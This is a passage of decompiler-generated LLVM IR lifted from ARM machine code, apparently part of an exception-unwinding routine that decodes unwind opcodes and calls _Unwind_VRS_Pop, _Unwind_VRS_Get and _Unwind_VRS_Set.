  %v0_1b064 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b064 = trunc i32 %v0_1b064 to i8
  %v2_1b064 = load i32, i32* @r5, align 4
  %v3_1b064 = add i32 %v2_1b064, 8
  %v4_1b064 = inttoptr i32 %v3_1b064 to i8*
  store i8 %v1_1b064, i8* %v4_1b064, align 1
  %v0_1b068 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b068 = load i32, i32* @r5, align 4
  %v2_1b068 = inttoptr i32 %v1_1b068 to i32*
  store i32 %v0_1b068, i32* %v2_1b068, align 4
  br label %dec_label_pc_1b06c

dec_label_pc_1b06c:                               ; preds = %.thread52, %dec_label_pc_1b04c
  %v0_1b06c = load i32, i32* %r0.global-to-local, align 4
  %v3_1b06c = udiv i32 %v0_1b06c, 16777216
  %v1_1b070 = urem i32 %v3_1b06c, 16
  %v3_1b074 = mul i32 %v0_1b06c, 256
  store i32 %v3_1b074, i32* %r0.global-to-local, align 4
  %v1_1b078 = add nuw nsw i32 %v1_1b070, 1
  store i32 %v1_1b078, i32* %r2.global-to-local, align 4
  %v1_1b07c = and i32 %v3_1b06c, 240
  store i32 %v1_1b07c, i32* %r3.global-to-local, align 4
  %v1_1b080 = load i32, i32* @r5, align 4
  %v2_1b080 = inttoptr i32 %v1_1b080 to i32*
  store i32 %v3_1b074, i32* %v2_1b080, align 4
  %v0_1b084 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b084 = load i32, i32* %r3.global-to-local, align 4
  %v4_1b084 = mul i32 %v1_1b084, 4096
  %v5_1b084 = or i32 %v4_1b084, %v0_1b084
  br label %dec_label_pc_1b088

dec_label_pc_1b088:                               ; preds = %dec_label_pc_1b038, %dec_label_pc_1b06c
  %storemerge130 = phi i32 [ %v5_1b084, %dec_label_pc_1b06c ], [ 720897, %dec_label_pc_1b038 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ae9c

dec_label_pc_1b090:                               ; preds = %dec_label_pc_1adbc
  %v0_1b090 = load i32, i32* @r5, align 4
  %v1_1b090 = add i32 %v0_1b090, 8
  %v2_1b090 = inttoptr i32 %v1_1b090 to i8*
  %v3_1b090 = load i8, i8* %v2_1b090, align 1
  %v4_1b090 = zext i8 %v3_1b090 to i32
  store i32 %v4_1b090, i32* %r3.global-to-local, align 4
  %v2_1b094 = icmp eq i8 %v3_1b090, 0
  store i1 %v2_1b094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b094, label %dec_label_pc_1b23c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_1b090
  %v2_1b098 = add nsw i32 %v4_1b090, -1
  store i32 %v2_1b098, i32* %r3.global-to-local, align 4
  %v2_1b09c = trunc i32 %v2_1b098 to i8
  store i8 %v2_1b09c, i8* %v2_1b090, align 1
  %v0_1b0a0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b0a0.pr.pr, label %.thread56.dec_label_pc_1b23c_crit_edge, label %dec_label_pc_1b0a4

.thread56.dec_label_pc_1b23c_crit_edge:           ; preds = %.thread56
  %v0_1b23c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b23c

dec_label_pc_1b0a4:                               ; preds = %.thread56, %dec_label_pc_1b248
  %v0_1b0a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b0a4 = udiv i32 %v0_1b0a4, 16777216
  store i32 %v3_1b0a4, i32* %r3.global-to-local, align 4
  store i32 %v3_1b0a4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_1b0a4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1b0ac = mul i32 %v0_1b0a4, 256
  store i32 %v3_1b0ac, i32* %r0.global-to-local, align 4
  %v1_1b0b0 = load i32, i32* @r5, align 4
  %v2_1b0b0 = inttoptr i32 %v1_1b0b0 to i32*
  store i32 %v3_1b0ac, i32* %v2_1b0b0, align 4
  br i1 %tmp184, label %dec_label_pc_1ae6c, label %dec_label_pc_1b0b8

dec_label_pc_1b0b8:                               ; preds = %dec_label_pc_1b0a4
  %v0_1b0b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b0b8 = and i32 %v0_1b0b8, 240
  store i32 %v1_1b0b8, i32* %r3.global-to-local, align 4
  %v2_1b0b8 = icmp eq i32 %v1_1b0b8, 0
  store i1 %v2_1b0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0b8, label %dec_label_pc_1b0c0, label %dec_label_pc_1ae6c

dec_label_pc_1b0c0:                               ; preds = %dec_label_pc_1b0b8
  %v0_1b0c0 = load i32, i32* @r7, align 4
  store i32 %v0_1b0c0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_1b0c8 = load i32, i32* %r2.global-to-local, align 4
  %v4_1b0c8 = call i32 @_Unwind_VRS_Pop(i32 %v0_1b0c0, i32 4, i32 %v2_1b0c8, i32 0)
  store i32 %v4_1b0c8, i32* %r0.global-to-local, align 4
  %v2_1b0cc = icmp eq i32 %v4_1b0c8, 0
  store i1 %v2_1b0cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0cc, label %dec_label_pc_1ab9c.backedge, label %dec_label_pc_1b0d4

dec_label_pc_1b0d4:                               ; preds = %dec_label_pc_1b0c0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1acc4

dec_label_pc_1b0dc:                               ; preds = %dec_label_pc_1af08
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1b0e8 = load i32, i32* @r7, align 4
  store i32 %v0_1b0e8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_1b0f4 = call i32 @_Unwind_VRS_Get(i32 %v0_1b0e8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1b0f4, i32* %r0.global-to-local, align 4
  %v0_1b0f8 = load i32, i32* @r5, align 4
  %v1_1b0f8 = add i32 %v0_1b0f8, 8
  %v2_1b0f8 = inttoptr i32 %v1_1b0f8 to i8*
  %v3_1b0f8 = load i8, i8* %v2_1b0f8, align 1
  %v4_1b0f8 = zext i8 %v3_1b0f8 to i32
  store i32 %v4_1b0f8, i32* %r1.global-to-local, align 4
  %v2_1b0fc = icmp eq i8 %v3_1b0f8, 0
  store i1 %v2_1b0fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0fc, label %dec_label_pc_1b10c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1b0dc
  %v2_1b100 = add nsw i32 %v4_1b0f8, -1
  store i32 %v2_1b100, i32* %r3.global-to-local, align 4
  %v2_1b104 = trunc i32 %v2_1b100 to i8
  store i8 %v2_1b104, i8* %v2_1b0f8, align 1
  %v0_1b108.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b108.pr.pr, label %.thread58.dec_label_pc_1b10c_crit_edge, label %dec_label_pc_1b138

.thread58.dec_label_pc_1b10c_crit_edge:           ; preds = %.thread58
  %v0_1b10c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b10c

dec_label_pc_1b10c:                               ; preds = %.thread58.dec_label_pc_1b10c_crit_edge, %dec_label_pc_1b0dc
  %v2_1b120 = phi i32 [ %v0_1b10c.pre, %.thread58.dec_label_pc_1b10c_crit_edge ], [ %v0_1b0f8, %dec_label_pc_1b0dc ]
  %v1_1b10c = add i32 %v2_1b120, 9
  %v2_1b10c = inttoptr i32 %v1_1b10c to i8*
  %v3_1b10c = load i8, i8* %v2_1b10c, align 1
  %v4_1b10c = zext i8 %v3_1b10c to i32
  store i32 %v4_1b10c, i32* %r3.global-to-local, align 4
  %v2_1b110 = icmp eq i8 %v3_1b10c, 0
  store i1 %v2_1b110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b110, label %bb158, label %dec_label_pc_1b11c

bb158:                                            ; preds = %dec_label_pc_1b10c
  %v1_1b114 = load i32, i32* @r6, align 4
  store i32 %v1_1b114, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b160

dec_label_pc_1b11c:                               ; preds = %dec_label_pc_1b10c
  %v1_1b11c = add nsw i32 %v4_1b10c, -1
  store i32 %v1_1b11c, i32* %r3.global-to-local, align 4
  %v1_1b120 = trunc i32 %v1_1b11c to i8
  store i8 %v1_1b120, i8* %v2_1b10c, align 1
  %v0_1b124 = load i32, i32* @r5, align 4
  %v1_1b124 = add i32 %v0_1b124, 4
  %v2_1b124 = inttoptr i32 %v1_1b124 to i32*
  %v3_1b124 = load i32, i32* %v2_1b124, align 4
  store i32 %v3_1b124, i32* %r2.global-to-local, align 4
  %v1_1b128 = inttoptr i32 %v3_1b124 to i32*
  %v2_1b128 = load i32, i32* %v1_1b128, align 4
  store i32 %v2_1b128, i32* %r0.global-to-local, align 4
  %v4_1b128 = add i32 %v3_1b124, 4
  store i32 %v4_1b128, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1b130 = inttoptr i32 %v0_1b124 to i32*
  store i32 %v2_1b128, i32* %v1_1b130, align 4
  %v5_1b130 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1b130, i32* %v2_1b124, align 4
  %v0_1b134 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b134 = trunc i32 %v0_1b134 to i8
  %v2_1b134 = load i32, i32* @r5, align 4
  %v3_1b134 = add i32 %v2_1b134, 8
  %v4_1b134 = inttoptr i32 %v3_1b134 to i8*
  store i8 %v1_1b134, i8* %v4_1b134, align 1
  br label %dec_label_pc_1b138

dec_label_pc_1b138:                               ; preds = %.thread58, %dec_label_pc_1b11c
  %v0_1b138 = load i32, i32* @r5, align 4
  %v1_1b138 = inttoptr i32 %v0_1b138 to i32*
  %v2_1b138 = load i32, i32* %v1_1b138, align 4
  store i32 %v2_1b138, i32* %r3.global-to-local, align 4
  %v3_1b13c = mul i32 %v2_1b138, 256
  store i32 %v3_1b13c, i32* %r0.global-to-local, align 4
  %v3_1b140 = udiv i32 %v2_1b138, 16777216
  store i32 %v3_1b140, i32* %r2.global-to-local, align 4
  store i32 %v3_1b13c, i32* %v1_1b138, align 4
  %v0_1b148 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b148 = and i32 %v0_1b148, 128
  %v2_1b148 = icmp eq i32 %v1_1b148, 0
  store i1 %v2_1b148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b148, label %.thread129, label %dec_label_pc_1b15c

.thread129:                                       ; preds = %dec_label_pc_1b138
  %v4_1b14c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1b14c, i32* %ip.global-to-local, align 4
  %v1_1b150 = urem i32 %v0_1b148, 256
  store i32 %v1_1b150, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_1b1d0

dec_label_pc_1b15c:                               ; preds = %dec_label_pc_1b138
  %v1_1b15063 = urem i32 %v0_1b148, 256
  store i32 %v1_1b15063, i32* %r2.global-to-local, align 4
  %v0_1b15c = load i32, i32* @r5, align 4
  %v1_1b15c = add i32 %v0_1b15c, 8
  %v2_1b15c = inttoptr i32 %v1_1b15c to i8*
  %v3_1b15c = load i8, i8* %v2_1b15c, align 1
  %v4_1b15c = zext i8 %v3_1b15c to i32
  store i32 %v4_1b15c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b160

dec_label_pc_1b160:                               ; preds = %bb158, %dec_label_pc_1b15c
  %v3_1b18099 = phi i32 [ %v2_1b120, %bb158 ], [ %v0_1b15c, %dec_label_pc_1b15c ]
  %v0_1b16892 = phi i32 [ %v1_1b114, %bb158 ], [ %v1_1b15063, %dec_label_pc_1b15c ]
  %v3_1b160 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1b160, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1b168

dec_label_pc_1b168:                               ; preds = %dec_label_pc_1b168.backedge, %dec_label_pc_1b160
  %v3_1b180 = phi i32 [ %v3_1b180100, %dec_label_pc_1b168.backedge ], [ %v3_1b18099, %dec_label_pc_1b160 ]
  %v0_1b17c = phi i32 [ %v2_1b16c.pre, %dec_label_pc_1b168.backedge ], [ 2, %dec_label_pc_1b160 ]
  %v0_1b16c = phi i32 [ %v0_1b16c.pre, %dec_label_pc_1b168.backedge ], [ %v3_1b160, %dec_label_pc_1b160 ]
  %v0_1b168 = phi i32 [ %v0_1b16895, %dec_label_pc_1b168.backedge ], [ %v0_1b16892, %dec_label_pc_1b160 ]
  %v1_1b168 = urem i32 %v0_1b168, 128
  %v7_1b16c = shl i32 %v1_1b168, %v0_1b17c
  %v8_1b16c = add i32 %v7_1b16c, %v0_1b16c
  store i32 %v8_1b16c, i32* %ip.global-to-local, align 4
  %v0_1b170 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b170 = icmp eq i32 %v0_1b170, 0
  store i1 %v2_1b170, i1* %cpsr_z.global-to-local, align 1
  %v1_1b174 = add i32 %v0_1b170, -1
  store i32 %v1_1b174, i32* %r3.global-to-local, align 4
  store i32 %v8_1b16c, i32* %stack_var_-36, align 4
  %v1_1b17c = add i32 %v0_1b17c, 7
  store i32 %v1_1b17c, i32* @lr, align 4
  br i1 %v2_1b170, label %dec_label_pc_1b188, label %bb159

bb159:                                            ; preds = %dec_label_pc_1b168
  %v2_1b180 = trunc i32 %v1_1b174 to i8
  %v4_1b180 = add i32 %v3_1b180, 8
  %v5_1b180 = inttoptr i32 %v4_1b180 to i8*
  store i8 %v2_1b180, i8* %v5_1b180, align 1
  %v0_1b184.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b184.pr, label %.dec_label_pc_1b188_crit_edge, label %dec_label_pc_1b1b4

.dec_label_pc_1b188_crit_edge:                    ; preds = %bb159
  %v0_1b188.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b188

dec_label_pc_1b188:                               ; preds = %.dec_label_pc_1b188_crit_edge, %dec_label_pc_1b168
  %v2_1b1a0 = phi i32 [ %v0_1b188.pre, %.dec_label_pc_1b188_crit_edge ], [ %v3_1b180, %dec_label_pc_1b168 ]
  %v1_1b188 = add i32 %v2_1b1a0, 9
  %v2_1b188 = inttoptr i32 %v1_1b188 to i8*
  %v3_1b188 = load i8, i8* %v2_1b188, align 1
  %v4_1b188 = zext i8 %v3_1b188 to i32
  store i32 %v4_1b188, i32* %r3.global-to-local, align 4
  %v2_1b18c = icmp eq i8 %v3_1b188, 0
  store i1 %v2_1b18c, i1* %cpsr_z.global-to-local, align 1
  %v1_1b190 = add nsw i32 %v4_1b188, -1
  store i32 %v1_1b190, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1b18c, label %dec_label_pc_1b168.backedge, label %dec_label_pc_1b19c

dec_label_pc_1b19c:                               ; preds = %dec_label_pc_1b188
  %v1_1b19c = add i32 %v2_1b1a0, 4
  %v2_1b19c = inttoptr i32 %v1_1b19c to i32*
  %v3_1b19c = load i32, i32* %v2_1b19c, align 4
  store i32 %v3_1b19c, i32* %r2.global-to-local, align 4
  %v1_1b1a0 = trunc i32 %v1_1b190 to i8
  store i8 %v1_1b1a0, i8* %v2_1b188, align 1
  %v0_1b1a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b1a4 = inttoptr i32 %v0_1b1a4 to i32*
  %v2_1b1a4 = load i32, i32* %v1_1b1a4, align 4
  store i32 %v2_1b1a4, i32* %r0.global-to-local, align 4
  %v4_1b1a4 = add i32 %v0_1b1a4, 4
  store i32 %v4_1b1a4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1b1ac = load i32, i32* @r5, align 4
  %v3_1b1ac = add i32 %v2_1b1ac, 8
  %v4_1b1ac = inttoptr i32 %v3_1b1ac to i8*
  store i8 3, i8* %v4_1b1ac, align 1
  %v0_1b1b0 = load i32, i32* @r5, align 4
  %v1_1b1b0 = inttoptr i32 %v0_1b1b0 to i32*
  %v2_1b1b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1b1b0, i32* %v1_1b1b0, align 4
  %v3_1b1b0 = add i32 %v0_1b1b0, 4
  %v4_1b1b0 = inttoptr i32 %v3_1b1b0 to i32*
  %v5_1b1b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1b1b0, i32* %v4_1b1b0, align 4
  br label %dec_label_pc_1b1b4

dec_label_pc_1b1b4:                               ; preds = %bb159, %dec_label_pc_1b19c
  %v0_1b1b4 = load i32, i32* @r5, align 4
  %v1_1b1b4 = inttoptr i32 %v0_1b1b4 to i32*
  %v2_1b1b4 = load i32, i32* %v1_1b1b4, align 4
  store i32 %v2_1b1b4, i32* %r3.global-to-local, align 4
  %v3_1b1b8 = udiv i32 %v2_1b1b4, 16777216
  store i32 %v3_1b1b8, i32* %r2.global-to-local, align 4
  %v1_1b1bc = and i32 %v3_1b1b8, 128
  %v2_1b1bc = icmp eq i32 %v1_1b1bc, 0
  store i1 %v2_1b1bc, i1* %cpsr_z.global-to-local, align 1
  %v3_1b1c0 = mul i32 %v2_1b1b4, 256
  store i32 %v3_1b1c0, i32* %r0.global-to-local, align 4
  store i32 %v3_1b1c0, i32* %v1_1b1b4, align 4
  %v0_1b1c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b1c8 = urem i32 %v0_1b1c8, 256
  store i32 %v1_1b1c8, i32* %r2.global-to-local, align 4
  br i1 %v2_1b1bc, label %dec_label_pc_1b1d0.loopexit, label %dec_label_pc_1b1fc

dec_label_pc_1b1d0.loopexit:                      ; preds = %dec_label_pc_1b1b4
  %v0_1b1d4.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1b1d8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b1d0

dec_label_pc_1b1d0:                               ; preds = %dec_label_pc_1b1d0.loopexit, %.thread129
  %v2_1b1d8 = phi i32 [ 2, %.thread129 ], [ %v2_1b1d8.pre, %dec_label_pc_1b1d0.loopexit ]
  %v0_1b1d4 = phi i32 [ %v4_1b14c, %.thread129 ], [ %v0_1b1d4.pre, %dec_label_pc_1b1d0.loopexit ]
  %v0_1b1d0 = phi i32 [ %v1_1b150, %.thread129 ], [ %v1_1b1c8, %dec_label_pc_1b1d0.loopexit ]
  %v1_1b1d0 = urem i32 %v0_1b1d0, 128
  %v1_1b1d4 = add i32 %v0_1b1d4, 516
  %v7_1b1d8 = shl i32 %v1_1b1d0, %v2_1b1d8
  %v8_1b1d8 = add i32 %v1_1b1d4, %v7_1b1d8
  store i32 %v8_1b1d8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1b1e0 = load i32, i32* @r7, align 4
  store i32 %v0_1b1e0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_1b1d8, i32* %stack_var_-36, align 4
  %v5_1b1f4 = call i32 @_Unwind_VRS_Set(i32 %v0_1b1e0, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1b1f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ab9c.backedge

dec_label_pc_1b1fc:                               ; preds = %dec_label_pc_1b1b4
  %v0_1b1fc = load i32, i32* @r5, align 4
  %v1_1b1fc = add i32 %v0_1b1fc, 8
  %v2_1b1fc = inttoptr i32 %v1_1b1fc to i8*
  %v3_1b1fc = load i8, i8* %v2_1b1fc, align 1
  %v4_1b1fc = zext i8 %v3_1b1fc to i32
  store i32 %v4_1b1fc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b168.backedge

dec_label_pc_1b168.backedge:                      ; preds = %dec_label_pc_1b1fc, %dec_label_pc_1b188
  %v3_1b180100 = phi i32 [ %v0_1b1fc, %dec_label_pc_1b1fc ], [ %v2_1b1a0, %dec_label_pc_1b188 ]
  %v0_1b16895 = phi i32 [ %v1_1b1c8, %dec_label_pc_1b1fc ], [ 176, %dec_label_pc_1b188 ]
  %v0_1b16c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1b16c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b168

dec_label_pc_1b204:                               ; preds = %dec_label_pc_1af00
  %v0_1b204 = load i32, i32* @r5, align 4
  %v1_1b204 = add i32 %v0_1b204, 8
  %v2_1b204 = inttoptr i32 %v1_1b204 to i8*
  %v3_1b204 = load i8, i8* %v2_1b204, align 1
  %v4_1b204 = zext i8 %v3_1b204 to i32
  store i32 %v4_1b204, i32* %r3.global-to-local, align 4
  %v2_1b208 = icmp eq i8 %v3_1b204, 0
  store i1 %v2_1b208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b208, label %dec_label_pc_1b26c, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_1b204
  %v2_1b20c = add nsw i32 %v4_1b204, -1
  store i32 %v2_1b20c, i32* %r3.global-to-local, align 4
  %v2_1b210 = trunc i32 %v2_1b20c to i8
  store i8 %v2_1b210, i8* %v2_1b204, align 1
  %v0_1b214.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b214.pr.pr, label %.thread66.dec_label_pc_1b26c_crit_edge, label %dec_label_pc_1b218

.thread66.dec_label_pc_1b26c_crit_edge:           ; preds = %.thread66
  %v0_1b26c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b26c

dec_label_pc_1b218:                               ; preds = %.thread66, %dec_label_pc_1b278
  %v0_1b218 = load i32, i32* %r0.global-to-local, align 4
  %v3_1b218 = udiv i32 %v0_1b218, 16777216
  store i32 %v3_1b218, i32* %r3.global-to-local, align 4
  store i32 %v3_1b218, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_1b218, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_1b220 = mul i32 %v0_1b218, 256
  store i32 %v3_1b220, i32* %r0.global-to-local, align 4
  %v1_1b224 = load i32, i32* @r5, align 4
  %v2_1b224 = inttoptr i32 %v1_1b224 to i32*
  store i32 %v3_1b220, i32* %v2_1b224, align 4
  br i1 %tmp185, label %dec_label_pc_1ae6c, label %dec_label_pc_1b22c

dec_label_pc_1b22c:                               ; preds = %dec_label_pc_1b218
  %v0_1b22c = load i32, i32* %r3.global-to-local, align 4
  %v1_1b22c = and i32 %v0_1b22c, 240
  store i32 %v1_1b22c, i32* %r1.global-to-local, align 4
  %v2_1b22c = icmp eq i32 %v1_1b22c, 0
  store i1 %v2_1b22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b22c, label %dec_label_pc_1b22c.dec_label_pc_1ae9c_crit_edge, label %dec_label_pc_1b234

dec_label_pc_1b22c.dec_label_pc_1ae9c_crit_edge:  ; preds = %dec_label_pc_1b22c
  %v2_1aea4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ae9c

dec_label_pc_1b234:                               ; preds = %dec_label_pc_1b22c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1acc4

dec_label_pc_1b23c:                               ; preds = %.thread56.dec_label_pc_1b23c_crit_edge, %dec_label_pc_1b090
  %v2_1b24c = phi i32 [ %v0_1b23c.pre, %.thread56.dec_label_pc_1b23c_crit_edge ], [ %v0_1b090, %dec_label_pc_1b090 ]
  %v1_1b23c = add i32 %v2_1b24c, 9
  %v2_1b23c = inttoptr i32 %v1_1b23c to i8*
  %v3_1b23c = load i8, i8* %v2_1b23c, align 1
  %v4_1b23c = zext i8 %v3_1b23c to i32
  store i32 %v4_1b23c, i32* %r3.global-to-local, align 4
  %v2_1b240 = icmp eq i8 %v3_1b23c, 0
  store i1 %v2_1b240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b240, label %dec_label_pc_1ae6c, label %dec_label_pc_1b248

dec_label_pc_1b248:                               ; preds = %dec_label_pc_1b23c
  %v1_1b248 = add nsw i32 %v4_1b23c, -1
  store i32 %v1_1b248, i32* %r3.global-to-local, align 4
  %v1_1b24c = trunc i32 %v1_1b248 to i8
  store i8 %v1_1b24c, i8* %v2_1b23c, align 1
  %v0_1b250 = load i32, i32* @r5, align 4
  %v1_1b250 = add i32 %v0_1b250, 4
  %v2_1b250 = inttoptr i32 %v1_1b250 to i32*
  %v3_1b250 = load i32, i32* %v2_1b250, align 4
  store i32 %v3_1b250, i32* %r2.global-to-local, align 4
  %v1_1b254 = inttoptr i32 %v3_1b250 to i32*
  %v2_1b254 = load i32, i32* %v1_1b254, align 4
  store i32 %v2_1b254, i32* %r0.global-to-local, align 4
  %v4_1b254 = add i32 %v3_1b250, 4
  store i32 %v4_1b254, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1b254, i32* %v2_1b250, align 4
  %v0_1b260 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b260 = trunc i32 %v0_1b260 to i8
  %v2_1b260 = load i32, i32* @r5, align 4
  %v3_1b260 = add i32 %v2_1b260, 8
  %v4_1b260 = inttoptr i32 %v3_1b260 to i8*
  store i8 %v1_1b260, i8* %v4_1b260, align 1
  %v0_1b264 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b264 = load i32, i32* @r5, align 4
  %v2_1b264 = inttoptr i32 %v1_1b264 to i32*
  store i32 %v0_1b264, i32* %v2_1b264, align 4
  br label %dec_label_pc_1b0a4

dec_label_pc_1b26c:                               ; preds = %.thread66.dec_label_pc_1b26c_crit_edge, %dec_label_pc_1b204
  %v2_1b27c = phi i32 [ %v0_1b26c.pre, %.thread66.dec_label_pc_1b26c_crit_edge ], [ %v0_1b204, %dec_label_pc_1b204 ]
  %v1_1b26c = add i32 %v2_1b27c, 9
  %v2_1b26c = inttoptr i32 %v1_1b26c to i8*
  %v3_1b26c = load i8, i8* %v2_1b26c, align 1
  %v4_1b26c = zext i8 %v3_1b26c to i32
  store i32 %v4_1b26c, i32* %r3.global-to-local, align 4
  %v2_1b270 = icmp eq i8 %v3_1b26c, 0
  store i1 %v2_1b270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b270, label %dec_label_pc_1ae6c, label %dec_label_pc_1b278

dec_label_pc_1b278:                               ; preds = %dec_label_pc_1b26c
  %v1_1b278 = add nsw i32 %v4_1b26c, -1
  store i32 %v1_1b278, i32* %r3.global-to-local, align 4
  %v1_1b27c = trunc i32 %v1_1b278 to i8
  store i8 %v1_1b27c, i8* %v2_1b26c, align 1
  %v0_1b280 = load i32, i32* @r5, align 4
  %v1_1b280 = add i32 %v0_1b280, 4
  %v2_1b280 = inttoptr i32 %v1_1b280 to i32*
  %v3_1b280 = load i32, i32* %v2_1b280, align 4
  store i32 %v3_1b280, i32* %r2.global-to-local, align 4
  %v1_1b284 = inttoptr i32 %v3_1b280 to i32*
  %v2_1b284 = load i32, i32* %v1_1b284, align 4
  store i32 %v2_1b284, i32* %r0.global-to-local, align 4
  %v4_1b284 = add i32 %v3_1b280, 4
  store i32 %v4_1b284, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1b284, i32* %v2_1b280, align 4
  %v0_1b290 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b290 = trunc i32 %v0_1b290 to i8
  %v2_1b290 = load i32, i32* @r5, align 4
  %v3_1b290 = add i32 %v2_1b290, 8
  %v4_1b290 = inttoptr i32 %v3_1b290 to i8*
  store i8 %v1_1b290, i8* %v4_1b290, align 1
  %v0_1b294 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b294 = load i32, i32* @r5, align 4
  %v2_1b294 = inttoptr i32 %v1_1b294 to i32*
  store i32 %v0_1b294, i32* %v2_1b294, align 4
  br label %dec_label_pc_1b218

; uselistorder directives
  uselistorder i32 %v3_1b220, { 1, 0 }
  uselistorder i1 %tmp185, { 1, 0 }
  uselistorder i32 %v3_1b218, { 1, 0 }
  uselistorder i32 %v0_1b218, { 1, 0, 2 }
  uselistorder i32 %v1_1b1c8, { 1, 2, 0 }
  uselistorder i32 %v3_1b1c0, { 1, 0 }
  uselistorder i32 %v3_1b1b8, { 1, 0 }
  uselistorder i32 %v2_1b1a0, { 2, 0, 1 }
  uselistorder i32 %v1_1b15063, { 1, 0 }
  uselistorder i32 %v1_1b150, { 1, 0 }
  uselistorder i32 %v3_1b13c, { 1, 0 }
  uselistorder i32 %v2_1b138, { 1, 0, 2 }
  uselistorder i32 %v3_1b0ac, { 1, 0 }
  uselistorder i1 %tmp184, { 1, 0 }
  uselistorder i32 %v3_1b0a4, { 1, 0 }
  uselistorder i32 %v0_1b0a4, { 1, 0, 2 }
  uselistorder i32 %storemerge130, { 1, 0 }
  uselistorder i32 %v3_1b074, { 1, 0 }
  uselistorder i32 %storemerge131, { 1, 0 }
  uselistorder i32 %v3_1b008, { 1, 0 }
  uselistorder i32 %v0_1afb0, { 3, 2, 1, 0 }
  uselistorder i32 %v2_1afa8, { 1, 0 }
  uselistorder i32 %v2_1afa0, { 1, 0 }
  uselistorder i32 %storemerge132, { 1, 0 }
  uselistorder i32 %v3_1af68, { 1, 0 }
  uselistorder i32 %v0_1aea0, { 2, 1, 0 }
  uselistorder i32 %v1_1ae80, { 1, 0 }
  uselistorder i32 %v0_1adb4, { 1, 0 }
  uselistorder i32 %v0_1ada0, { 1, 0, 2, 3 }
  uselistorder i1 %v2_1ad38, { 1, 0 }
  uselistorder i32 %v1_1ad34, { 2, 1, 0 }
  uselistorder i32 %storemerge135, { 1, 0 }
  uselistorder i32 %v3_1acd4, { 1, 0 }
  uselistorder i32 %v4_1acac, { 1, 0 }
